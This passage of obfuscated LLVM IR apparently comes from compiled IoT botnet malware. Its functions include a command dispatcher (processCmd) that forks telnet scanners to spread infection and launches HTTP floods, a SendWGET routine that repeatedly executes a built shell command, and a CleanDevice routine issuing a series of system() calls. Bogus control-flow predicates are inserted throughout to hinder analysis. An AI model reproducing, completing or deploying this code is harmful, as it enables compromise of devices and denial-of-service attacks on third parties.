originalBB:                                       ; preds = %originalBBalteredBB, %44
  %53 = load i32, i32* @x.83
  %54 = load i32, i32* @y.84
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %61

; <label>:61:                                     ; preds = %99, %originalBBpart2
  %62 = load i32, i32* %15, align 4
  %63 = sext i32 %62 to i64
  %64 = call i64 @time(i64* null) #5
  %65 = icmp sgt i64 %63, %64
  br i1 %65, label %66, label %100

; <label>:66:                                     ; preds = %61
  %67 = load i8*, i8** %8, align 8
  %68 = load i16, i16* %9, align 2
  %69 = call i32 @socket_connect(i8* %67, i16 zeroext %68)
  store i32 %69, i32* %13, align 4
  %70 = load i32, i32* %13, align 4
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %72, label %99

; <label>:72:                                     ; preds = %66
  %73 = load i32, i32* @x.83
  %74 = load i32, i32* @y.84
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %72
  %81 = load i32, i32* %13, align 4
  %82 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %83 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %84 = call i64 @strlen(i8* %83) #9
  %85 = call i64 @write(i32 %81, i8* %82, i64 %84)
  %86 = load i32, i32* %13, align 4
  %87 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %88 = call i64 @read(i32 %86, i8* %87, i64 1)
  %89 = load i32, i32* %13, align 4
  %90 = call i32 @close(i32 %89)
  %91 = load i32, i32* @x.83
  %92 = load i32, i32* @y.84
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %99

; <label>:99:                                     ; preds = %originalBBpart24, %66
  br label %61

; <label>:100:                                    ; preds = %61
  %101 = load i32, i32* @x.83
  %102 = load i32, i32* @y.84
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %100
  call void @exit(i32 0) #12
  %109 = load i32, i32* @x.83
  %110 = load i32, i32* @y.84
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  unreachable

; <label>:117:                                    ; preds = %31
  br label %118

; <label>:118:                                    ; preds = %117
  %119 = load i32, i32* %14, align 4
  %120 = add nsw i32 %119, 1
  store i32 %120, i32* %14, align 4
  br label %27

; <label>:121:                                    ; preds = %27
  %122 = load i32, i32* @x.83
  %123 = load i32, i32* @y.84
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %121
  %130 = load i32, i32* @x.83
  %131 = load i32, i32* @y.84
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %44
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %72
  %138 = load i32, i32* %13, align 4
  %139 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %140 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %141 = call i64 @strlen(i8* %140) #9
  %142 = call i64 @write(i32 %138, i8* %139, i64 %141)
  %143 = load i32, i32* %13, align 4
  %144 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %145 = call i64 @read(i32 %143, i8* %144, i64 1)
  %146 = load i32, i32* %13, align 4
  %147 = call i32 @close(i32 %146)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %100
  call void @exit(i32 0) #12
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %121
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define void @CleanDevice() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.166, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.167, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.168, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.169, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.170, i32 0, i32 0))
  %6 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.171, i32 0, i32 0))
  %7 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.172, i32 0, i32 0))
  %8 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.173, i32 0, i32 0))
  %9 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.174, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.175, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.176, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.177, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.178, i32 0, i32 0))
  ret void
}

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @SendWGET(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca [80 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %8 = call i64 @time(i64* null) #5
  %9 = load i32, i32* %4, align 4
  %10 = sext i32 %9 to i64
  %11 = add nsw i64 %8, %10
  %12 = trunc i64 %11 to i32
  store i32 %12, i32* %5, align 4
  %13 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %14 = call i32 (i8*, i8*, ...) @sprintf(i8* %13, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.179, i32 0, i32 0)) #5
  %15 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %16 = load i8*, i8** %3, align 8
  %17 = call i8* @strcat(i8* %15, i8* %16) #5
  %18 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %19 = call %struct._IO_FILE* @popen(i8* %18, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.180, i32 0, i32 0))
  store %struct._IO_FILE* %19, %struct._IO_FILE** %6, align 8
  br label %20

; <label>:20:                                     ; preds = %originalBBpart24, %2
  %21 = load i32, i32* @x.87
  %22 = load i32, i32* @y.88
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %20
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = call i64 @time(i64* null) #5
  %32 = icmp sgt i64 %30, %31
  %33 = load i32, i32* @x.87
  %34 = load i32, i32* @y.88
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %32, label %41, label %60

; <label>:41:                                     ; preds = %originalBBpart2
  %42 = load i32, i32* @x.87
  %43 = load i32, i32* @y.88
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %41
  %50 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %51 = call i32 @system(i8* %50)
  %52 = load i32, i32* @x.87
  %53 = load i32, i32* @y.88
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %20

; <label>:60:                                     ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %20
  %61 = load i32, i32* %5, align 4
  %62 = sext i32 %61 to i64
  %63 = call i64 @time(i64* null) #5
  %64 = icmp sgt i64 %62, %63
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %41
  %65 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %66 = call i32 @system(i8* %65)
  br label %originalBB1
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #3

declare %struct._IO_FILE* @popen(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %37 = load i8**, i8*** %4, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @strcmp(i8* %39, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.181, i32 0, i32 0)) #9
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %43, label %42

; <label>:42:                                     ; preds = %2
  br label %1433

; <label>:43:                                     ; preds = %2
  %44 = load i8**, i8*** %4, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 0
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @strcmp(i8* %46, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.182, i32 0, i32 0)) #9
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %281, label %49

; <label>:49:                                     ; preds = %43
  %50 = load i32, i32* @x.89
  %51 = load i32, i32* @y.90
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %49
  %58 = load i8**, i8*** %4, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 1
  %60 = load i8*, i8** %59, align 8
  %61 = call i32 @strcmp(i8* %60, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.183, i32 0, i32 0)) #9
  %62 = icmp ne i32 %61, 0
  %63 = load i32, i32* @x.89
  %64 = load i32, i32* @y.90
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %62, label %180, label %71

; <label>:71:                                     ; preds = %originalBBpart2
  %72 = call i32 @fork() #5
  store i32 %72, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %73 = call i64 @sysconf(i32 84) #5
  %74 = trunc i64 %73 to i32
  store i32 %74, i32* %7, align 4
  store i32 999999, i32* %8, align 4
  %75 = load i32, i32* %7, align 4
  %76 = icmp eq i32 %75, 1
  br i1 %76, label %77, label %78

; <label>:77:                                     ; preds = %71
  store i32 500, i32* %8, align 4
  br label %78

; <label>:78:                                     ; preds = %77, %71
  %79 = load i32, i32* @x.89
  %80 = load i32, i32* @y.90
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %78
  %87 = load i32, i32* %7, align 4
  %88 = icmp sge i32 %87, 2
  %89 = load i32, i32* @x.89
  %90 = load i32, i32* @y.90
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %88, label %97, label %98

; <label>:97:                                     ; preds = %originalBBpart24
  store i32 1000, i32* %8, align 4
  br label %98

; <label>:98:                                     ; preds = %97, %originalBBpart24
  %99 = load i32, i32* @x.89
  %100 = load i32, i32* @y.90
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %98
  %107 = load i32, i32* %5, align 4
  %108 = icmp ugt i32 %107, 0
  %109 = load i32, i32* @x.89
  %110 = load i32, i32* @y.90
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %108, label %117, label %119

; <label>:117:                                    ; preds = %originalBBpart28
  %118 = load i32, i32* %5, align 4
  store i32 %118, i32* @scanPid, align 4
  br label %1433

; <label>:119:                                    ; preds = %originalBBpart28
  %120 = load i32, i32* @x.89
  %121 = load i32, i32* @y.90
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %119
  %128 = load i32, i32* %5, align 4
  %129 = icmp eq i32 %128, -1
  %130 = load i32, i32* @x.89
  %131 = load i32, i32* @y.90
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %129, label %138, label %139

; <label>:138:                                    ; preds = %originalBBpart212
  br label %1433

; <label>:139:                                    ; preds = %originalBBpart212
  %140 = load i32, i32* @x.89
  %141 = load i32, i32* @y.90
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %139
  %148 = load i32, i32* @x.89
  %149 = load i32, i32* @y.90
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %156

; <label>:156:                                    ; preds = %originalBBpart216
  store i32 0, i32* %6, align 4
  br label %157

; <label>:157:                                    ; preds = %176, %156
  %158 = load i32, i32* %6, align 4
  %159 = load i32, i32* %7, align 4
  %160 = icmp slt i32 %158, %159
  br i1 %160, label %161, label %179

; <label>:161:                                    ; preds = %157
  %162 = call i64 @time(i64* null) #5
  %163 = call i32 @getpid() #5
  %164 = sext i32 %163 to i64
  %165 = xor i64 %162, %164
  %166 = call i32 @getppid() #5
  %167 = sext i32 %166 to i64
  %168 = add nsw i64 %165, %167
  %169 = trunc i64 %168 to i32
  call void @srand(i32 %169) #5
  %170 = call i64 @time(i64* null) #5
  %171 = call i32 @getpid() #5
  %172 = sext i32 %171 to i64
  %173 = xor i64 %170, %172
  %174 = trunc i64 %173 to i32
  call void @init_rand(i32 %174)
  %175 = load i32, i32* %8, align 4
  call void @TelnetScanner(i32 100, i32 %175)
  call void @_exit(i32 0) #11
  unreachable
                                                  ; No predecessors!
  %177 = load i32, i32* %6, align 4
  %178 = add nsw i32 %177, 1
  store i32 %178, i32* %6, align 4
  br label %157

; <label>:179:                                    ; preds = %157
  br label %180

; <label>:180:                                    ; preds = %179, %originalBBpart2
  %181 = load i8**, i8*** %4, align 8
  %182 = getelementptr inbounds i8*, i8** %181, i64 1
  %183 = load i8*, i8** %182, align 8
  %184 = call i32 @strcmp(i8* %183, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.184, i32 0, i32 0)) #9
  %185 = icmp ne i32 %184, 0
  br i1 %185, label %209, label %186

; <label>:186:                                    ; preds = %180
  %187 = load i32, i32* @scanPid, align 4
  %188 = icmp eq i32 %187, 0
  br i1 %188, label %189, label %190

; <label>:189:                                    ; preds = %186
  br label %1433

; <label>:190:                                    ; preds = %186
  %191 = load i32, i32* @x.89
  %192 = load i32, i32* @y.90
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %190
  %199 = load i32, i32* @scanPid, align 4
  %200 = call i32 @kill(i32 %199, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  %201 = load i32, i32* @x.89
  %202 = load i32, i32* @y.90
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %209

; <label>:209:                                    ; preds = %originalBBpart220, %180
  %210 = load i32, i32* @x.89
  %211 = load i32, i32* @y.90
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %209
  %218 = load i8**, i8*** %4, align 8
  %219 = getelementptr inbounds i8*, i8** %218, i64 1
  %220 = load i8*, i8** %219, align 8
  %221 = call i32 @strcmp(i8* %220, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.185, i32 0, i32 0)) #9
  %222 = icmp ne i32 %221, 0
  %223 = load i32, i32* @x.89
  %224 = load i32, i32* @y.90
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %222, label %280, label %231

; <label>:231:                                    ; preds = %originalBBpart224
  %232 = load i8**, i8*** %4, align 8
  %233 = getelementptr inbounds i8*, i8** %232, i64 1
  %234 = load i8*, i8** %233, align 8
  %235 = call i32 @atoi(i8* %234) #9
  store i32 %235, i32* %9, align 4
  %236 = load i8**, i8*** %4, align 8
  %237 = getelementptr inbounds i8*, i8** %236, i64 2
  %238 = load i8*, i8** %237, align 8
  %239 = call i32 @atoi(i8* %238) #9
  store i32 %239, i32* %10, align 4
  %240 = call i32 @listFork()
  %241 = icmp ne i32 %240, 0
  br i1 %241, label %263, label %242

; <label>:242:                                    ; preds = %231
  %243 = load i32, i32* @x.89
  %244 = load i32, i32* @y.90
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %242
  %251 = load i32, i32* @mainCommSock, align 4
  %252 = call i32 (i32, i8*, ...) @sockprintf(i32 %251, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.186, i32 0, i32 0))
  %253 = load i32, i32* %10, align 4
  %254 = load i32, i32* %9, align 4
  call void @TelnetScanner(i32 %253, i32 %254)
  call void @_exit(i32 0) #11
  %255 = load i32, i32* @x.89
  %256 = load i32, i32* @y.90
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  unreachable

; <label>:263:                                    ; preds = %231
  %264 = load i32, i32* @x.89
  %265 = load i32, i32* @y.90
  %266 = sub i32 %264, 1
  %267 = mul i32 %264, %266
  %268 = urem i32 %267, 2
  %269 = icmp eq i32 %268, 0
  %270 = icmp slt i32 %265, 10
  %271 = or i1 %269, %270
  br i1 %271, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %263
  %272 = load i32, i32* @x.89
  %273 = load i32, i32* @y.90
  %274 = sub i32 %272, 1
  %275 = mul i32 %272, %274
  %276 = urem i32 %275, 2
  %277 = icmp eq i32 %276, 0
  %278 = icmp slt i32 %273, 10
  %279 = or i1 %277, %278
  br i1 %279, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %1433

; <label>:280:                                    ; preds = %originalBBpart224
  br label %281

; <label>:281:                                    ; preds = %280, %43
  %282 = load i32, i32* @x.89
  %283 = load i32, i32* @y.90
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %281
  %290 = load i8**, i8*** %4, align 8
  %291 = getelementptr inbounds i8*, i8** %290, i64 0
  %292 = load i8*, i8** %291, align 8
  %293 = call i32 @strcmp(i8* %292, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.187, i32 0, i32 0)) #9
  %294 = icmp ne i32 %293, 0
  %295 = load i32, i32* @x.89
  %296 = load i32, i32* @y.90
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %294, label %346, label %303

; <label>:303:                                    ; preds = %originalBBpart236
  %304 = load i32, i32* %3, align 4
  %305 = icmp slt i32 %304, 6
  br i1 %305, label %318, label %306

; <label>:306:                                    ; preds = %303
  %307 = load i8**, i8*** %4, align 8
  %308 = getelementptr inbounds i8*, i8** %307, i64 3
  %309 = load i8*, i8** %308, align 8
  %310 = call i32 @atoi(i8* %309) #9
  %311 = icmp slt i32 %310, 1
  br i1 %311, label %318, label %312

; <label>:312:                                    ; preds = %306
  %313 = load i8**, i8*** %4, align 8
  %314 = getelementptr inbounds i8*, i8** %313, i64 5
  %315 = load i8*, i8** %314, align 8
  %316 = call i32 @atoi(i8* %315) #9
  %317 = icmp slt i32 %316, 1
  br i1 %317, label %318, label %319

; <label>:318:                                    ; preds = %312, %306, %303
  br label %1433

; <label>:319:                                    ; preds = %312
  %320 = call i32 @listFork()
  %321 = icmp ne i32 %320, 0
  br i1 %321, label %322, label %323

; <label>:322:                                    ; preds = %319
  br label %1433

; <label>:323:                                    ; preds = %319
  %324 = load i8**, i8*** %4, align 8
  %325 = getelementptr inbounds i8*, i8** %324, i64 1
  %326 = load i8*, i8** %325, align 8
  %327 = load i8**, i8*** %4, align 8
  %328 = getelementptr inbounds i8*, i8** %327, i64 2
  %329 = load i8*, i8** %328, align 8
  %330 = load i8**, i8*** %4, align 8
  %331 = getelementptr inbounds i8*, i8** %330, i64 3
  %332 = load i8*, i8** %331, align 8
  %333 = call i32 @atoi(i8* %332) #9
  %334 = trunc i32 %333 to i16
  %335 = load i8**, i8*** %4, align 8
  %336 = getelementptr inbounds i8*, i8** %335, i64 4
  %337 = load i8*, i8** %336, align 8
  %338 = load i8**, i8*** %4, align 8
  %339 = getelementptr inbounds i8*, i8** %338, i64 5
  %340 = load i8*, i8** %339, align 8
  %341 = call i32 @atoi(i8* %340) #9
  %342 = load i8**, i8*** %4, align 8
  %343 = getelementptr inbounds i8*, i8** %342, i64 6
  %344 = load i8*, i8** %343, align 8
  %345 = call i32 @atoi(i8* %344) #9
  call void @SendHTTP(i8* %326, i8* %329, i16 zeroext %334, i8* %337, i32 %341, i32 %345)
  call void @exit(i32 0) #12
  unreachable

; <label>:346:                                    ; preds = %originalBBpart236
  %347 = load i8**, i8*** %4, align 8
  %348 = getelementptr inbounds i8*, i8** %347, i64 0
  %349 = load i8*, i8** %348, align 8
  %350 = call i32 @strcmp(i8* %349, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.188, i32 0, i32 0)) #9
  %351 = icmp ne i32 %350, 0
  br i1 %351, label %443, label %352

; <label>:352:                                    ; preds = %346
  %353 = load i32, i32* %3, align 4
  %354 = icmp slt i32 %353, 6
  br i1 %354, label %383, label %355

; <label>:355:                                    ; preds = %352
  %356 = load i8**, i8*** %4, align 8
  %357 = getelementptr inbounds i8*, i8** %356, i64 3
  %358 = load i8*, i8** %357, align 8
  %359 = call i32 @atoi(i8* %358) #9
  %360 = icmp slt i32 %359, 1
  br i1 %360, label %383, label %361

; <label>:361:                                    ; preds = %355
  %362 = load i32, i32* @x.89
  %363 = load i32, i32* @y.90
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %361
  %370 = load i8**, i8*** %4, align 8
  %371 = getelementptr inbounds i8*, i8** %370, i64 5
  %372 = load i8*, i8** %371, align 8
  %373 = call i32 @atoi(i8* %372) #9
  %374 = icmp slt i32 %373, 1
  %375 = load i32, i32* @x.89
  %376 = load i32, i32* @y.90
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %374, label %383, label %400

; <label>:383:                                    ; preds = %originalBBpart240, %355, %352
  %384 = load i32, i32* @x.89
  %385 = load i32, i32* @y.90
